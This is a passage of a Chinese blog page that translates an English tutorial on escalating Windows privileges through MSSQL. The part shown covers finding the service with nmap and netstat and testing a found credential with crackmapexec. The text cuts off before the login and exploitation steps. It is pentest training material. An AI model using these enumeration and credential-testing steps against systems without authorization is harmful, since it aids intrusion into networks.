<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-MSSQL" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-MSSQL | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-MSSQL"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-MSSQL | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 MSSQL – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 MSSQL – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-MSSQL"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-MSSQL" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-MSSQL" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-MSSQL</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-MSSQL</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/mssql/" target="_blank" rel="noopener noreferrer">MSSQL – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 搜寻 MSSQL 服务</a></li>
<li><a href="#id2">2 场景一：在数据库中查找凭证</a>
<ul>
<li><a href="#id2.1">2.1 手动枚举数据库</a></li>
<li><a href="#id2.2">2.2 破解发现的哈希</a></li>
<li><a href="#id2.3">2.3 权限横向移动</a></li>
</ul>
</li>
<li><a href="#id3">3 场景二：转储 MSSQL 服务账户的哈希</a>
<ul>
<li><a href="#id3.1">3.1 破解服务账户的哈希</a></li>
<li><a href="#id3.2">3.2 获取服务帐户的 Shell</a></li>
</ul>
</li>
<li><a href="#id4">4 场景三：在 MSSQL 中执行 CMD 命令</a>
<ul>
<li><a href="#id4.1">4.1 搜寻 MSSQL 特权用户 sa 的凭据</a></li>
<li><a href="#id4.2">4.2 破解 ZIP 文件密码</a></li>
<li><a href="#id4.3">4.3 使用 xp_cmdshell 获取 SYSTEM Shell</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将深入探讨针对 MSSQL 服务器的各种攻击。通过这些攻击，以了解如何利用该服务进行 Windows 权限的提升。</p>
<p>接下来，我们将看到导致权限提升的三种情况：（1）在数据库中寻找有价值的信息；（2）诱骗 MSSQL 服务账户的哈希值；（3）用 MSSQL 的 sa 账户获得 SYSTEM shell。</p>
<p>但在此之前，我们将通过远程和本地枚举 MSSQL 服务，以确定它的运行状态。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1搜寻-mssql-服务"><strong><div id="id1">1、搜寻 MSSQL 服务</div></strong><a href="#1搜寻-mssql-服务" class="hash-link" aria-label="1搜寻-mssql-服务的直接链接" title="1搜寻-mssql-服务的直接链接">​</a></h2>
<p>通常，我们并不认为 MSSQL 会是一种权限提升的手段。但是，在许多情况下，是能够利用 MSSQL 来提升到不同的用户、服务帐户或 SYSTEM。</p>
<blockquote>
<p>Microsoft SQL Server （MSSQL） 是由 Microsoft 开发的关系数据库管理系统。作为数据库服务器，它是一个软件产品，其主要功能是根据其他软件应用程序的请求存储和检索数据。</p>
</blockquote>
<p>基本上，有两种方法可用于查找目标上正在运行的 MSSQL 服务。第一种是远程查找，仅当该服务允许远程连接时这种方法才可行。第二种是本地查找，当防火墙阻止外部连接 SQL 服务器或该服务在本地（127.0.0.1）运行时才会采用这种方式。</p>
<p>（1）如果 MSSQL 服务允许远程连接，那么我们在 nmap 扫描时就会在默认端口 1433 上看到它。【但也可能不是在默认端口】</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161830714-1006457333-81142884714ea9dea196ea652f920f59.png" width="612" height="740" class="img_ev3q"></p>
<p>从上图可以看到 MSSQL 运行在默认端口 1433 上。此外，我们还可以看到 WinRM 服务运行在 5985 端口，RDP 服务运行在 3389 端口，这些信息对于后面的小节来说也是很关键的信息。</p>
<blockquote>
<p>如果发现 MSSQL 正在运行，那我们需要测试找到的所有凭证，以尝试登录服务器。</p>
</blockquote>
<p>（2）如果在 nmap 扫描期间没有看到 MSSQL 在外部运行，但是当我们在目标机器上站稳了脚跟，使用以下命令枚举时，发现 MSSQL 正在运行：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">netstat -nao | findstr /i &quot;Local listening established&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831095-1903726307-d962a5a83628ed7d130202863be376ae.png" width="653" height="302" class="img_ev3q"></p>
<p>这意味着该服务可能是被防火墙阻止了外部连接，因为从上图来看它监听在 0.0.0.0 全接口上。而如果服务监听在 127.0.0.1 回环接口上，则表示它仅在本地运行，并且只能由 localhost 访问。</p>
<p>在这种情况下，我们只能借助端口转发功能，将 MSSQL 本地回环端口转发到攻击者的机器上，这样就可以在攻击者本机与它进行交互。</p>
<blockquote>
<p>关于端口转发的详情，可在<a href="https://juggernaut-sec.com/port-forwarding/" target="_blank" rel="noopener noreferrer">此处</a>查看相关文章。</p>
</blockquote>
<p>现在，已经确认 MSSQL 服务正在目标机上运行着（无论内/外部运行），接下来我们就需要查找访问服务器的凭据。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2场景一在数据库中查找凭证"><strong><div id="id2">2、场景一：在数据库中查找凭证</div></strong><a href="#2场景一在数据库中查找凭证" class="hash-link" aria-label="2场景一在数据库中查找凭证的直接链接" title="2场景一在数据库中查找凭证的直接链接">​</a></h2>
<p>在这个场景中，假设我们在枚举目标的过程中找到了一个用户的凭据，通过该凭据能够登录 MSSQL 服务器。</p>
<p>然后，我们将学习如何从自定义数据库中提取信息，并在其中一个表中找到存储的用户名/哈希值。接着，我们成功的破解了其中一个哈希值，并发现可以通过该凭据访问系统。</p>
<p>从本质上讲，我们把这种权限从一个用户提升到另一个用户，称为<strong>横向提权</strong>或<strong>水平提权</strong>。</p>
<blockquote>
<p>权限提升并不总是 <strong>从用户直接提升到管理员</strong> 那么简单。有时我们会发现，在找到攻击向量以获得管理员或 SYSTEM 权限（纵向）之前，我们需要先从一个用户提升到另一个用户（横向）。</p>
</blockquote>
<p>在此示例中，假设我们在端口 445 上的 SMB 共享中发现了一个有趣的文件，其中包含用户 bob 的凭据。</p>
<p><strong>bob : P@ssw0rd</strong></p>
<p>现在我们找到了一个凭据，但是还不知道可以在什么地方去使用它，因此还需在任何可能的地方不断的测试这对凭据，以收获意外惊喜。</p>
<p>使用工具 <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">crackmapexec</a> 对该凭据进行 SMB 连接测试：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 172.16.1.250 -u bob -p &#x27;P@ssw0rd&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831935-814057042-aa1731b874861a5990bb8ad50c8ec1e4.png" width="1024" height="127" class="img_ev3q"></p>
<p>可以看到该凭据是有效的，但是，却无法以该用户的身份在系统上获得立足点。</p>
<blockquote>
<p>注：通过 crackmapexec 工具测试的凭证标识 如果是 <strong>[-]</strong> 提示，则表示该凭证是无效的； 如果是 <strong>[+]</strong> 提示，则表示该凭证是有效的，但没有访问权限；如果是 <strong>[+] 和 (Pwn3d!)</strong> 提示，则表示该凭证有效且拥有访问权限。</p>
</blockquote>
<blockquote>
<p>用法注意：crackmapexec 帮助中的标准用法似乎是 <code>crackmapexec smb [option] target</code> 但是我发现这种用法是错误的，应该以<code>crackmapexec smb target [option]</code> 的方式使用才对，例如 <code>crackmapexec smb 192.168.56.50 -u user.txt -p pass.txt --continue-on-success</code>。</p>
</blockquote>
<p>最终，通过在 MSSQL 服务上进行测试，发现该凭据有效且可以访问数据库！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21手动枚举数据库"><strong><div id="id2.1">2.1、手动枚举数据库</div></strong><a href="#21手动枚举数据库" class="hash-link" aria-label="21手动枚举数据库的直接链接" title="21手动枚举数据库的直接链接">​</a></h4>
<p>我们可以使用两种工具登录 MSSQL 服务器并与之交互： <strong>sqsh</strong> 和 <strong>mssqlclient.py</strong>。</p>
<p>sqsh 工具内置于 kali 中，而 mssqlclient.py 是 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> 套件中的工具。</p>
<p>要使用 mssqlclient 登录，可以使用以下命令：</p>
